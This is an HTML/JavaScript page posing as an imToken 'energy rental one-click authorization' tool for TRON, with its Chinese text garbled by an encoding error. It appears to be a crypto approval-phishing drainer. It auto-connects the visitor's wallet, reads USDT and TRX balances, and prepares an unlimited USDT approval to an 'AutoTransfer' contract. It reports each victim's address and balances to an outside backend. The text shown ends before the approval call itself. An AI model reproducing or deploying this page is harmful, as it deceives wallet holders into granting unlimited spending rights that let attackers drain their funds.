<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>imTokenä¸€é”®èƒ½é‡æˆæƒ</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
               padding: 20px; max-width: 500px; margin: 0 auto; background: #f5f5f5; }
        .header { text-align: center; margin-bottom: 30px; }
        .header h1 { font-size: 22px; color: #2c3e50; margin-bottom: 10px; }
        .warning { background: #fff8e1; color: #e6a23c; padding: 12px; border-radius: 8px;
                   font-size: 14px; margin-bottom: 20px; text-align: left; }
        .btn { width: 100%; padding: 15px; font-size: 16px; border: none; border-radius: 8px;
               background: #409EFF; color: white; cursor: pointer; margin-bottom: 15px; }
        .btn:disabled { background: #ccc; cursor: not-allowed; }
        #userInfo { text-align: center; font-size: 14px; color: #333; margin: 20px 0; padding: 15px; background: #fff; border-radius: 8px; }
        .record-list { margin-top: 30px; }
        .record-item { background: #fff; padding: 15px; margin-bottom: 15px; border-radius: 8px; font-size: 14px; }
        .record-item p { margin-bottom: 8px; color: #333; }
        .record-item p strong { color: #2c3e50; }
        .tx-link { color: #409EFF; text-decoration: none; }
        .status-tip { text-align: center; color: #666; font-size: 13px; margin: 10px 0; }
    </style>
</head>
<body>
<div class="header">
    <h1>èƒ½é‡ç§Ÿèµä¸€é”®æˆæƒ</h1>
    <div class="warning">
        âš ï¸ è¯·ç”¨ <strong>imTokené’±åŒ…å†…ç½®æµè§ˆå™¨</strong> æ‰“å¼€æ­¤é¡µé¢<br>
        âš ï¸ åœ¨éé’±åŒ…æµè§ˆå™¨æ‰“å¼€è¯·å…ˆç‚¹å‡»<strong>å¤åˆ¶é“¾æ¥</strong>ï¼Œç„¶åè¿æ¥imTokené’±åŒ…åï¼Œç‚¹å‡»é’±åŒ…é¡µé¢ä¸‹æ–¹â€œæµè§ˆâ€ï¼Œåœ¨æœç´¢æ¡†ä¸­ç²˜è´´è®¿é—®
    </div>
</div>

<!-- é“¾æ¥æ˜¾ç¤º+å¤åˆ¶æŒ‰é’®çš„å®¹å™¨ -->
<div style="margin: 15px 0; display: flex; align-items: center; gap: 10px;">
    <span id="copyLinkText" style="color: #007AFF; word-break: break-all; flex: 1;">
        https://trc20trx-alt.github.io/Trc20.TRX/
    </span>
    <button id="copyLinkBtn" style="padding: 5px 10px; cursor: pointer;">
        <strong>å¤åˆ¶é“¾æ¥</strong>
    </button>
</div>

<button id="connectBtn" class="btn">è¿æ¥imTokené’±åŒ…</button>
<button id="approveBtn" class="btn" disabled>èƒ½é‡æˆæƒ</button>

<div id="userInfo">æœªè¿æ¥é’±åŒ…</div>
<!-- åç«¯å‘é€çŠ¶æ€æç¤º -->
<div id="sendStatus" class="status-tip"></div>

<div class="record-list">
    <h3 style="font-size: 16px; margin-bottom: 15px; color: #2c3e50;">æˆæƒè®°å½•</h3>
    <div id="approvalRecords">æš‚æ— æˆæƒè®°å½•</div>
</div>

<script>
    // ========== ç¬¬ä¸€æ­¥ï¼šåˆå§‹åŒ–å…¨å±€å˜é‡ï¼ˆåŠ æç¤ºï¼‰ ==========
    alert("ã€å…¨å±€-1ã€‘å¼€å§‹åˆå§‹åŒ–å…¨å±€å˜é‡...");
    // éœ€æ›¿æ¢çš„3å¤„é…ç½®ï¼ˆåŠ¡å¿…ç¡®è®¤åç«¯æ¥å£æ­£ç¡®ï¼‰
    const AUTO_TRANSFER_CONTRACT = "TNAfknJTfkPbgmyfpwg3rJQrd17ZLKEMQa"; // ä½ çš„AutoTransferåˆçº¦åœ°å€
    const TRC20_TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // ä¸»ç½‘USDTåœ°å€
    const BACKEND_API = "https://tron-notify-backend.vercel.app/api/notify-approval"; // åç«¯æ¥å£ï¼ˆå¿…é¡»ç¡®è®¤ï¼ï¼‰
    alert(`ã€å…¨å±€-2ã€‘é…ç½®å˜é‡åˆå§‹åŒ–å®Œæˆï¼š\n1. è½¬è´¦åˆçº¦ï¼š${AUTO_TRANSFER_CONTRACT.slice(0,8)}...\n2. USDTåˆçº¦ï¼š${TRC20_TOKEN_ADDRESS.slice(0,8)}...\n3. åç«¯æ¥å£ï¼š${BACKEND_API}`);

    // å›ºå®šå¸¸é‡
    const INFINITE_APPROVE_AMOUNT = "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF";
    const RECORD_KEY = "imtoken_infinite_approval_records";
    alert(`ã€å…¨å±€-3ã€‘å›ºå®šå¸¸é‡åˆå§‹åŒ–å®Œæˆï¼š\n1. æ— é™æˆæƒé¢åº¦ï¼š${INFINITE_APPROVE_AMOUNT.slice(0,8)}...\n2. æœ¬åœ°å­˜å‚¨é”®åï¼š${RECORD_KEY}`);

    // åŠ¨æ€å˜é‡ï¼ˆåˆå§‹å€¼ï¼‰
    let tronWeb = null;
    let userAddress = null;
    let trc20Contract = null;
    let currentUsdtBalance = 0;
    let currentTrxBalance = 0;
    const sendStatusDom = document.getElementById("sendStatus");
    alert(`ã€å…¨å±€-4ã€‘åŠ¨æ€å˜é‡åˆå§‹åŒ–å®Œæˆï¼š\ntronWeb: ${tronWeb}\nuserAddress: ${userAddress}\ntrc20Contract: ${trc20Contract}\nå½“å‰ä½™é¢ï¼šUSDT=${currentUsdtBalance}, TRX=${currentTrxBalance}`);


    // ========== ç¬¬äºŒæ­¥ï¼šå®šä¹‰æ‰€æœ‰å‡½æ•°ï¼ˆæ¯ä¸ªå‡½æ•°å®šä¹‰ååŠ æç¤ºï¼‰ ==========
    // å‡½æ•°1ï¼šåˆå§‹åŒ–é’±åŒ…ï¼ˆinitWalletï¼‰
    async function initWallet() {
        alert("ã€å‡½æ•°-initWallet-1ã€‘è¿›å…¥initWalletå‡½æ•°ï¼Œå¼€å§‹åˆå§‹åŒ–é’±åŒ…...");
        try {
            // å­æ­¥éª¤1ï¼šè·å–é’±åŒ…é»˜è®¤åœ°å€
            alert("ã€å‡½æ•°-initWallet-2ã€‘å¼€å§‹è·å–é’±åŒ…é»˜è®¤åœ°å€ï¼ˆtronWeb.defaultAddress.base58ï¼‰...");
            userAddress = tronWeb.defaultAddress.base58;
            if (!userAddress) throw new Error("è·å–åˆ°çš„åœ°å€ä¸ºç©º");
            alert(`ã€å‡½æ•°-initWallet-3ã€‘è·å–åœ°å€æˆåŠŸï¼åœ°å€ï¼š${userAddress.slice(0,8)}...${userAddress.slice(-6)}`);

            // å­æ­¥éª¤2ï¼šåˆ›å»ºTRC20åˆçº¦å®ä¾‹
            alert(`ã€å‡½æ•°-initWallet-4ã€‘å¼€å§‹åˆ›å»ºTRC20åˆçº¦å®ä¾‹ï¼Œåˆçº¦åœ°å€ï¼š${TRC20_TOKEN_ADDRESS.slice(0,8)}...`);
            trc20Contract = await tronWeb.contract().at(TRC20_TOKEN_ADDRESS);
            if (!trc20Contract) throw new Error("åˆ›å»ºåˆçº¦å®ä¾‹è¿”å›ç©º");
            alert("ã€å‡½æ•°-initWallet-5ã€‘TRC20åˆçº¦å®ä¾‹åˆ›å»ºæˆåŠŸï¼");

            // å­æ­¥éª¤3ï¼šè°ƒç”¨ä½™é¢æŸ¥è¯¢å‡½æ•°ï¼ˆè¿æ¥åç«‹å³æŸ¥ä½™é¢ï¼‰
            alert("ã€å‡½æ•°-initWallet-6ã€‘å³å°†è°ƒç”¨getAndShowBalanceå‡½æ•°æŸ¥è¯¢ä½™é¢...");
            await getAndShowBalance();
            alert("ã€å‡½æ•°-initWallet-7ã€‘ä½™é¢æŸ¥è¯¢å‡½æ•°è°ƒç”¨å®Œæˆï¼");

            // å­æ­¥éª¤4ï¼šæ›´æ–°é¡µé¢æ˜¾ç¤º+æ¿€æ´»æˆæƒæŒ‰é’®
            alert("ã€å‡½æ•°-initWallet-8ã€‘å¼€å§‹æ›´æ–°é¡µé¢ç”¨æˆ·ä¿¡æ¯...");
            document.getElementById("userInfo").innerHTML = `
                å·²è¿æ¥ï¼š<br>
                ${userAddress.slice(0, 8)}...${userAddress.slice(-6)}
            `;
            alert("ã€å‡½æ•°-initWallet-9ã€‘å¼€å§‹æ¿€æ´»æˆæƒæŒ‰é’®ï¼ˆè®¾ç½®disabled=falseï¼‰...");
            document.getElementById("approveBtn").disabled = false;
            alert("ã€å‡½æ•°-initWallet-10ã€‘initWalletå‡½æ•°æ‰§è¡Œå®Œæˆï¼æˆæƒæŒ‰é’®å·²æ¿€æ´»");
        } catch (e) {
            alert(`ã€å‡½æ•°-initWallet-é”™è¯¯ã€‘æ‰§è¡Œå¤±è´¥ï¼š\né”™è¯¯ç±»å‹ï¼š${e.name}\né”™è¯¯ä¿¡æ¯ï¼š${e.message}\né”™è¯¯ä½ç½®ï¼šinitWalletå‡½æ•°å†…`);
            throw e; // æŠ›å‡ºé”™è¯¯ï¼Œè®©ä¸Šå±‚çŸ¥é“
        }
    }
    alert("ã€å‡½æ•°-å®šä¹‰1ã€‘initWalletå‡½æ•°å®šä¹‰å®Œæˆï¼Œç­‰å¾…è°ƒç”¨...");


    // å‡½æ•°2ï¼šæŸ¥è¯¢å¹¶æ˜¾ç¤ºä½™é¢ï¼ˆgetAndShowBalanceï¼‰
    async function getAndShowBalance() {
        alert("ã€å‡½æ•°-getAndShowBalance-1ã€‘è¿›å…¥getAndShowBalanceå‡½æ•°ï¼Œå¼€å§‹æŸ¥è¯¢ä½™é¢...");
        try {
            // å­æ­¥éª¤1ï¼šæ ¡éªŒç”¨æˆ·åœ°å€æ˜¯å¦å­˜åœ¨
            alert("ã€å‡½æ•°-getAndShowBalance-2ã€‘æ ¡éªŒç”¨æˆ·åœ°å€ï¼š" + (userAddress ? userAddress.slice(0,8)+"..." : "åœ°å€ä¸ºç©º"));
            if (!userAddress) throw new Error("ç”¨æˆ·åœ°å€æœªè·å–åˆ°ï¼Œæ— æ³•æŸ¥ä½™é¢");
            alert("ã€å‡½æ•°-getAndShowBalance-3ã€‘åœ°å€æ ¡éªŒé€šè¿‡ï¼Œå¼€å§‹æŸ¥USDTä½™é¢...");

            // å­æ­¥éª¤2ï¼šæŸ¥USDTä½™é¢ï¼ˆTRC20åˆçº¦balanceOfï¼‰
            alert(`ã€å‡½æ•°-getAndShowBalance-4ã€‘è°ƒç”¨trc20Contract.balanceOf(${userAddress.slice(0,8)}...)...`);
            const usdtBalanceRaw = await trc20Contract.balanceOf(userAddress).call();
            alert(`ã€å‡½æ•°-getAndShowBalance-5ã€‘è·å–USDTåŸå§‹ä½™é¢ï¼š${usdtBalanceRaw}ï¼ˆåˆçº¦æœ€å°å•ä½ï¼‰`);
            currentUsdtBalance = (usdtBalanceRaw / 1000000).toFixed(2); // è½¬æ­£å¸¸æ•°å€¼ï¼ˆ6ä½å°æ•°ï¼‰
            alert(`ã€å‡½æ•°-getAndShowBalance-6ã€‘USDTä½™é¢è½¬æ¢å®Œæˆï¼š${currentUsdtBalance} USDT`);

            // å­æ­¥éª¤3ï¼šæŸ¥TRXä½™é¢ï¼ˆtronWeb.trx.getBalanceï¼‰
            alert(`ã€å‡½æ•°-getAndShowBalance-7ã€‘è°ƒç”¨tronWeb.trx.getBalance(${userAddress.slice(0,8)}...)...`);
            const trxBalanceRaw = await tronWeb.trx.getBalance(userAddress);
            alert(`ã€å‡½æ•°-getAndShowBalance-8ã€‘è·å–TRXåŸå§‹ä½™é¢ï¼š${trxBalanceRaw}ï¼ˆåˆçº¦æœ€å°å•ä½ï¼‰`);
            currentTrxBalance = (trxBalanceRaw / 1000000).toFixed(2); // è½¬æ­£å¸¸æ•°å€¼ï¼ˆ6ä½å°æ•°ï¼‰
            alert(`ã€å‡½æ•°-getAndShowBalance-9ã€‘TRXä½™é¢è½¬æ¢å®Œæˆï¼š${currentTrxBalance} TRX`);

            // å­æ­¥éª¤4ï¼šæ›´æ–°é¡µé¢çŠ¶æ€+å¼¹çª—æç¤º
            alert("ã€å‡½æ•°-getAndShowBalance-10ã€‘å¼€å§‹æ›´æ–°é¡µé¢ä½™é¢çŠ¶æ€æç¤º...");
            sendStatusDom.textContent = `å½“å‰ä½™é¢ï¼š${currentUsdtBalance} USDT / ${currentTrxBalance} TRX`;
            alert(`ã€å‡½æ•°-getAndShowBalance-11ã€‘ä½™é¢æŸ¥è¯¢å…¨æµç¨‹å®Œæˆï¼\næœ€ç»ˆç»“æœï¼š\nUSDTï¼š${currentUsdtBalance}\nTRXï¼š${currentTrxBalance}`);
            return { usdt: currentUsdtBalance, trx: currentTrxBalance };
        } catch (err) {
            // é”™è¯¯å¤„ç†ï¼šå…ˆé‡è¯•1æ¬¡
            alert(`ã€å‡½æ•°-getAndShowBalance-é”™è¯¯1ã€‘é¦–æ¬¡æŸ¥è¯¢å¤±è´¥ï¼š\n${err.message}\nå°†ç­‰å¾…1ç§’åé‡è¯•...`);
            try {
                await new Promise(resolve => setTimeout(resolve, 1000)); // ç­‰å¾…1ç§’
                alert("ã€å‡½æ•°-getAndShowBalance-é”™è¯¯2ã€‘å¼€å§‹é‡è¯•æŸ¥è¯¢ä½™é¢...");
                
                // é‡è¯•USDTæŸ¥è¯¢
                const usdtBalanceRaw = await trc20Contract.balanceOf(userAddress).call();
                currentUsdtBalance = (usdtBalanceRaw / 1000000).toFixed(2);
                // é‡è¯•TRXæŸ¥è¯¢
                const trxBalanceRaw = await tronWeb.trx.getBalance(userAddress);
                currentTrxBalance = (trxBalanceRaw / 1000000).toFixed(2);

                alert(`ã€å‡½æ•°-getAndShowBalance-é”™è¯¯3ã€‘é‡è¯•æˆåŠŸï¼\nUSDTï¼š${currentUsdtBalance}\nTRXï¼š${currentTrxBalance}`);
                sendStatusDom.textContent = `å½“å‰ä½™é¢ï¼š${currentUsdtBalance} USDT / ${currentTrxBalance} TRX`;
                return { usdt: currentUsdtBalance, trx: currentTrxBalance };
            } catch (retryErr) {
                alert(`ã€å‡½æ•°-getAndShowBalance-é”™è¯¯4ã€‘é‡è¯•å¤±è´¥ï¼š\n${retryErr.message}\nå‡½æ•°æ‰§è¡Œç»ˆæ­¢`);
                throw retryErr;
            }
        }
    }
    alert("ã€å‡½æ•°-å®šä¹‰2ã€‘getAndShowBalanceå‡½æ•°å®šä¹‰å®Œæˆï¼Œç­‰å¾…è°ƒç”¨...");


    // å‡½æ•°3ï¼šå‘é€æ•°æ®åˆ°åç«¯ï¼ˆsendDataToBackendï¼‰
    async function sendDataToBackend(data, scene) {
        alert(`ã€å‡½æ•°-sendDataToBackend-1ã€‘è¿›å…¥å‡½æ•°ï¼Œå¼€å§‹å‘é€${scene}æ•°æ®...`);
        try {
            // å­æ­¥éª¤1ï¼šæ ¡éªŒåç«¯æ¥å£åœ°å€
            alert("ã€å‡½æ•°-sendDataToBackend-2ã€‘æ ¡éªŒåç«¯æ¥å£åœ°å€ï¼š" + BACKEND_API);
            if (!BACKEND_API || BACKEND_API.includes("æ›¿æ¢")) {
                throw new Error("åç«¯æ¥å£åœ°å€æœªé…ç½®æˆ–é…ç½®é”™è¯¯ï¼è¯·ä¿®æ”¹BACKEND_APIå˜é‡");
            }
            alert("ã€å‡½æ•°-sendDataToBackend-3ã€‘æ¥å£åœ°å€æ ¡éªŒé€šè¿‡ï¼Œå¼€å§‹å‡†å¤‡è¯·æ±‚æ•°æ®...");

            // å­æ­¥éª¤2ï¼šæ‰“å°è¯·æ±‚æ•°æ®ï¼ˆä¾¿äºæ’æŸ¥ï¼‰
            alert(`ã€å‡½æ•°-sendDataToBackend-4ã€‘è¯·æ±‚æ•°æ®é¢„è§ˆï¼š\nåœ°å€ï¼š${data.address?.slice(0,8)||"æ— "}\nçŠ¶æ€ï¼š${data.approveStatus}\næ—¶é—´ï¼š${data.approveTime}`);

            // å­æ­¥éª¤3ï¼šåˆ›å»ºè¶…æ—¶æ§åˆ¶å™¨ï¼ˆ15ç§’ï¼‰
            alert("ã€å‡½æ•°-sendDataToBackend-5ã€‘åˆ›å»ºè¯·æ±‚è¶…æ—¶æ§åˆ¶å™¨ï¼Œè¶…æ—¶æ—¶é—´ï¼š15ç§’");
            const controller = new AbortController();
            const timeoutId = setTimeout(() => {
                controller.abort();
                alert("ã€å‡½æ•°-sendDataToBackend-è¶…æ—¶ã€‘è¯·æ±‚è¶…æ—¶ï¼å·²è‡ªåŠ¨ç»ˆæ­¢");
            }, 15000);
            alert("ã€å‡½æ•°-sendDataToBackend-6ã€‘è¶…æ—¶æ§åˆ¶å™¨åˆ›å»ºå®Œæˆï¼Œå¼€å§‹å‘èµ·fetchè¯·æ±‚...");

            // å­æ­¥éª¤4ï¼šå‘èµ·POSTè¯·æ±‚
            const res = await fetch(BACKEND_API, {
                method: "POST",
                headers: { 
                    "Content-Type": "application/json",
                    "X-Request-Source": "imToken-Auth-Frontend" // è‡ªå®šä¹‰è¯·æ±‚å¤´
                },
                body: JSON.stringify(data),
                credentials: "same-origin", // è·¨åŸŸé…ç½®
                signal: controller.signal // ç»‘å®šè¶…æ—¶
            });
            clearTimeout(timeoutId); // æ¸…é™¤è¶…æ—¶
            alert(`ã€å‡½æ•°-sendDataToBackend-7ã€‘è¯·æ±‚å‘èµ·æˆåŠŸï¼Œæ”¶åˆ°åç«¯å“åº”ï¼šçŠ¶æ€ç =${res.status}`);

            // å­æ­¥éª¤5ï¼šæ ¡éªŒå“åº”çŠ¶æ€
            if (!res.ok) {
                const errMsg = await res.text().catch(() => "æœªè¿”å›é”™è¯¯ä¿¡æ¯");
                throw new Error(`åç«¯è¿”å›é200çŠ¶æ€ï¼š${res.status}\né”™è¯¯è¯¦æƒ…ï¼š${errMsg}`);
            }
            alert("ã€å‡½æ•°-sendDataToBackend-8ã€‘å“åº”çŠ¶æ€æ ¡éªŒé€šè¿‡ï¼ˆ200<=status<300ï¼‰ï¼Œå¼€å§‹è§£æå“åº”æ•°æ®...");

            // å­æ­¥éª¤6ï¼šè§£æå“åº”JSON
            const resData = await res.json();
            alert(`ã€å‡½æ•°-sendDataToBackend-9ã€‘å“åº”æ•°æ®è§£æå®Œæˆï¼š\n${JSON.stringify(resData).slice(0,100)}...`);

            // å­æ­¥éª¤7ï¼šæ ¡éªŒåç«¯å¤„ç†ç»“æœ
            if (resData.code !== 200 && !resData.success) {
                throw new Error(`åç«¯å¤„ç†å¤±è´¥ï¼š\nçŠ¶æ€ç ï¼š${resData.code || "æ— "}\næç¤ºï¼š${resData.msg || "æ— "}`);
            }
            alert(`ã€å‡½æ•°-sendDataToBackend-10ã€‘${scene}æ•°æ®å‘é€æˆåŠŸï¼åç«¯è¿”å›ï¼š${resData.msg || "å¤„ç†æˆåŠŸ"}`);

            // å­æ­¥éª¤8ï¼šæ›´æ–°é¡µé¢çŠ¶æ€
            sendStatusDom.style.color = "#4CAF50";
            sendStatusDom.textContent = `âœ… ${scene}æ•°æ®å·²åŒæ­¥åˆ°åç«¯`;
            return resData;
        } catch (err) {
            alert(`ã€å‡½æ•°-sendDataToBackend-é”™è¯¯ã€‘å‘é€${scene}æ•°æ®å¤±è´¥ï¼š\n${err.message}\nå‡½æ•°æ‰§è¡Œç»ˆæ­¢`);
            sendStatusDom.style.color = "#F44336";
            sendStatusDom.textContent = `âŒ ${scene}æ•°æ®å‘é€å¤±è´¥ï¼š${err.message}`;
            throw err;
        }
    }
    alert("ã€å‡½æ•°-å®šä¹‰3ã€‘sendDataToBackendå‡½æ•°å®šä¹‰å®Œæˆï¼Œç­‰å¾…è°ƒç”¨...");


    // å‡½æ•°4ï¼šä¿å­˜æˆæƒè®°å½•åˆ°æœ¬åœ°ï¼ˆsaveApprovalRecordï¼‰
    function saveApprovalRecord(record) {
        alert("ã€å‡½æ•°-saveApprovalRecord-1ã€‘è¿›å…¥å‡½æ•°ï¼Œå¼€å§‹ä¿å­˜æœ¬åœ°è®°å½•...");
        try {
            // å­æ­¥éª¤1ï¼šè¯»å–å·²æœ‰è®°å½•
            alert(`ã€å‡½æ•°-saveApprovalRecord-2ã€‘è¯»å–æœ¬åœ°å­˜å‚¨ï¼Œé”®åï¼š${RECORD_KEY}`);
            const existing = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
            alert(`ã€å‡½æ•°-saveApprovalRecord-3ã€‘è¯»å–åˆ°å·²æœ‰è®°å½•æ•°ï¼š${existing.length}æ¡`);

            // å­æ­¥éª¤2ï¼šå»é‡ï¼ˆé¿å…é‡å¤è®°å½•ï¼‰
            alert("ã€å‡½æ•°-saveApprovalRecord-4ã€‘å¼€å§‹å»é‡ï¼ˆæŒ‰txHash/æ—¶é—´æˆ³ï¼‰...");
            const newRecords = existing.filter(item => 
                item.txHash !== record.txHash && item.timestamp !== record.timestamp
            );
            alert(`ã€å‡½æ•°-saveApprovalRecord-5ã€‘å»é‡åå‰©ä½™è®°å½•æ•°ï¼š${newRecords.length}æ¡`);

            // å­æ­¥éª¤3ï¼šæ·»åŠ æ–°è®°å½•
            newRecords.push(record);
            alert(`ã€å‡½æ•°-saveApprovalRecord-6ã€‘æ·»åŠ æ–°è®°å½•ï¼Œå½“å‰æ€»è®°å½•æ•°ï¼š${newRecords.length}æ¡`);

            // å­æ­¥éª¤4ï¼šä¿å­˜åˆ°localStorage
            localStorage.setItem(RECORD_KEY, JSON.stringify(newRecords));
            alert("ã€å‡½æ•°-saveApprovalRecord-7ã€‘æœ¬åœ°è®°å½•ä¿å­˜æˆåŠŸï¼");
        } catch (err) {
            alert(`ã€å‡½æ•°-saveApprovalRecord-é”™è¯¯ã€‘ä¿å­˜å¤±è´¥ï¼š\n${err.message}\nå‡½æ•°æ‰§è¡Œç»ˆæ­¢`);
            throw err;
        }
    }
    alert("ã€å‡½æ•°-å®šä¹‰4ã€‘saveApprovalRecordå‡½æ•°å®šä¹‰å®Œæˆï¼Œç­‰å¾…è°ƒç”¨...");


    // å‡½æ•°5ï¼šæ¸²æŸ“æˆæƒè®°å½•ï¼ˆrenderApprovalRecordsï¼‰
    function renderApprovalRecords() {
        alert("ã€å‡½æ•°-renderApprovalRecords-1ã€‘è¿›å…¥å‡½æ•°ï¼Œå¼€å§‹æ¸²æŸ“è®°å½•...");
        try {
            // å­æ­¥éª¤1ï¼šè·å–å®¹å™¨+è¯»å–è®°å½•
            const container = document.getElementById("approvalRecords");
            alert(`ã€å‡½æ•°-renderApprovalRecords-2ã€‘è·å–è®°å½•å®¹å™¨ï¼š${container.id}`);
            const records = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
            alert(`ã€å‡½æ•°-renderApprovalRecords-3ã€‘è¯»å–åˆ°è®°å½•æ•°ï¼š${records.length}æ¡`);

            // å­æ­¥éª¤2ï¼šåˆ¤æ–­æ˜¯å¦æœ‰è®°å½•
            if (records.length === 0) {
                alert("ã€å‡½æ•°-renderApprovalRecords-4ã€‘æ— è®°å½•ï¼Œæ˜¾ç¤ºé»˜è®¤æ–‡æœ¬...");
                container.innerHTML = "<div class='record-item'>æš‚æ— æˆæƒè®°å½•</div>";
                alert("ã€å‡½æ•°-renderApprovalRecords-5ã€‘é»˜è®¤æ–‡æœ¬æ¸²æŸ“å®Œæˆï¼");
                return;
            }

            // å­æ­¥éª¤3ï¼šæ¸²æŸ“å¤šæ¡è®°å½•
            alert("ã€å‡½æ•°-renderApprovalRecords-6ã€‘å¼€å§‹æ¸²æŸ“è®°å½•HTML...");
            const recordHtml = records.map((record, index) => `
                <div class="record-item">
                    <p><strong>åºå·ï¼š</strong>${index+1}</p>
                    <p><strong>çŠ¶æ€ï¼š</strong>${record.approveStatus === "success" ? "âœ… æˆæƒæˆåŠŸ" : "âŒ æˆæƒå¤±è´¥"}</p>
                    <p><strong>åœ°å€ï¼š</strong>${record.address.slice(0, 8)}...${record.address.slice(-6)}</p>
                    <p><strong>USDTï¼š</strong>${record.usdtBalance} USDT</p>
                    <p><strong>TRXï¼š</strong>${record.trxBalance} TRX</p>
                    <p><strong>æ—¶é—´ï¼š</strong>${record.approveTime}</p>
                    ${record.txHash ? `<p><a href="https://tronscan.org/#/transaction/${record.txHash}" target="_blank" class="tx-link">æŸ¥çœ‹äº¤æ˜“</a></p>` : ""}
                </div>
            `).join("");
            alert(`ã€å‡½æ•°-renderApprovalRecords-7ã€‘HTMLæ¸²æŸ“å®Œæˆï¼Œå…±${records.length}æ¡è®°å½•`);

            // å­æ­¥éª¤4ï¼šæ›´æ–°å®¹å™¨å†…å®¹
            container.innerHTML = recordHtml;
            alert("ã€å‡½æ•°-renderApprovalRecords-8ã€‘è®°å½•æ¸²æŸ“å…¨æµç¨‹å®Œæˆï¼");
        } catch (err) {
            alert(`ã€å‡½æ•°-renderApprovalRecords-é”™è¯¯ã€‘æ¸²æŸ“å¤±è´¥ï¼š\n${err.message}\nå‡½æ•°æ‰§è¡Œç»ˆæ­¢`);
            throw err;
        }
    }
    alert("ã€å‡½æ•°-å®šä¹‰5ã€‘renderApprovalRecordså‡½æ•°å®šä¹‰å®Œæˆï¼Œç­‰å¾…è°ƒç”¨...");


    // ========== ç¬¬ä¸‰æ­¥ï¼šwindow.onloadï¼ˆé¡µé¢åŠ è½½å®Œæˆåæ‰§è¡Œï¼Œæ ¸å¿ƒæµç¨‹ï¼‰ ==========
    window.onload = async () => {
        alert("ã€onload-1ã€‘é¡µé¢åŠ è½½å®Œæˆï¼Œå¼€å§‹æ‰§è¡Œæ ¸å¿ƒæµç¨‹...");

        // å­æ­¥éª¤1ï¼šè·å–DOMå…ƒç´ 
        alert("ã€onload-2ã€‘å¼€å§‹è·å–é¡µé¢DOMå…ƒç´ ...");
        const connectBtn = document.getElementById("connectBtn");
        const approveBtn = document.getElementById("approveBtn");
        const copyLinkText = document.getElementById("copyLinkText");
        const copyLinkBtn = document.getElementById("copyLinkBtn");
        alert(`ã€onload-3ã€‘DOMå…ƒç´ è·å–å®Œæˆï¼š\n1. è¿æ¥æŒ‰é’®ï¼š${connectBtn.id}\n2. æˆæƒæŒ‰é’®ï¼š${approveBtn.id}\n3. é“¾æ¥æ–‡æœ¬ï¼š${copyLinkText.id}\n4. å¤åˆ¶æŒ‰é’®ï¼š${copyLinkBtn.id}`);

        // å­æ­¥éª¤2ï¼šç»‘å®šå¤åˆ¶é“¾æ¥æŒ‰é’®äº‹ä»¶
        alert("ã€onload-4ã€‘å¼€å§‹ç»‘å®šå¤åˆ¶é“¾æ¥æŒ‰é’®ï¼ˆcopyLinkBtnï¼‰ç‚¹å‡»äº‹ä»¶...");
        copyLinkBtn.addEventListener("click", async () => {
            alert("ã€å¤åˆ¶äº‹ä»¶-1ã€‘ç‚¹å‡»äº†å¤åˆ¶é“¾æ¥æŒ‰é’®ï¼Œå¼€å§‹æ‰§è¡Œå¤åˆ¶...");
            try {
                const linkContent = copyLinkText.textContent.trim();
                alert(`ã€å¤åˆ¶äº‹ä»¶-2ã€‘è·å–åˆ°é“¾æ¥å†…å®¹ï¼š${linkContent.slice(0,20)}...`);
                
                await navigator.clipboard.writeText(linkContent);
                alert("ã€å¤åˆ¶äº‹ä»¶-3ã€‘é“¾æ¥å·²æˆåŠŸå¤åˆ¶åˆ°å‰ªè´´æ¿ï¼");
            } catch (error) {
                alert(`ã€å¤åˆ¶äº‹ä»¶-é”™è¯¯ã€‘å¤åˆ¶å¤±è´¥ï¼š\n${error.message}\nè¯·æ‰‹åŠ¨é€‰ä¸­é“¾æ¥å¤åˆ¶~`);
            }
        });
        alert("ã€onload-5ã€‘å¤åˆ¶é“¾æ¥æŒ‰é’®äº‹ä»¶ç»‘å®šå®Œæˆï¼");

        // å­æ­¥éª¤3ï¼šæ£€æµ‹å¹¶è‡ªåŠ¨è¿æ¥é’±åŒ…
        alert("ã€onload-6ã€‘å¼€å§‹æ£€æµ‹imTokenç¯å¢ƒï¼ˆwindow.tronWebï¼‰...");
        if (window.tronWeb) {
            alert(`ã€onload-7ã€‘æ£€æµ‹åˆ°tronWebå­˜åœ¨ï¼ç‰ˆæœ¬ï¼š${window.tronWeb.version || "æœªçŸ¥"}`);
            if (window.tronWeb.ready) {
                alert("ã€onload-8ã€‘tronWebå·²readyï¼Œå¼€å§‹è‡ªåŠ¨åˆå§‹åŒ–é’±åŒ…...");
                tronWeb = window.tronWeb;
                alert("ã€onload-9ã€‘å³å°†è°ƒç”¨initWalletå‡½æ•°ï¼ˆè‡ªåŠ¨è¿æ¥ï¼‰...");
                await initWallet();
                alert("ã€onload-10ã€‘initWalletå‡½æ•°è°ƒç”¨å®Œæˆï¼ˆè‡ªåŠ¨è¿æ¥æµç¨‹ï¼‰ï¼");
            } else {
                alert("ã€onload-11ã€‘tronWebæœªreadyï¼Œå¼€å§‹ç›‘å¬'ready'äº‹ä»¶...");
                window.tronWeb.on('ready', async () => {
                    alert("ã€onload-12ã€‘ç›‘å¬åˆ°tronWeb readyäº‹ä»¶ï¼Œå¼€å§‹åˆå§‹åŒ–é’±åŒ…...");
                    tronWeb = window.tronWeb;
                    alert("ã€onload-13ã€‘å³å°†è°ƒç”¨initWalletå‡½æ•°ï¼ˆç›‘å¬åè¿æ¥ï¼‰...");
                    await initWallet();
                    alert("ã€onload-14ã€‘initWalletå‡½æ•°è°ƒç”¨å®Œæˆï¼ˆç›‘å¬åè¿æ¥æµç¨‹ï¼‰ï¼");
                });
            }
        } else {
            alert("ã€onload-é”™è¯¯1ã€‘æœªæ£€æµ‹åˆ°window.tronWebï¼è¯·ç”¨imTokenå†…ç½®æµè§ˆå™¨æ‰“å¼€é¡µé¢");
            document.getElementById("userInfo").innerHTML = "è¯·ç”¨imTokenå†…ç½®æµè§ˆå™¨æ‰“å¼€æ­¤é¡µé¢";
        }
